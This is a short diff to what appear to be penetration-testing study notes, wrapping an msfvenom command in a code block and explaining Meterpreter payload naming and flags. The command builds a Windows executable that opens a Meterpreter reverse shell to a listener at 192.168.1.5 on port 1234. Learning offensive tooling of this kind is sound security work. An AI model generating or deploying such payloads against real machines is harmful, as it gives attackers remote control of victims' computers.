@@ -259,7 +259,9 @@ Finding vulnerabilities that can be exploited
 		- `windows/x64/meterpreter/reverse_tcp` : os/cpu-arch/type/connection-type
 	- non staged is shorter
 		- `windows/x64/meterpreter_bind_tcp` : os/cpu-arch/payload
-- `msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=1234 -f exe > /home/kali/Desktop/paylodx86.exe`
+```bash
+msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=1234 -f exe > /home/kali/Desktop/paylodx86.exe
+```
 	- -a : architecture
 	- -p : payload : can auto-select based on payload
 	- -f : filetype/formats
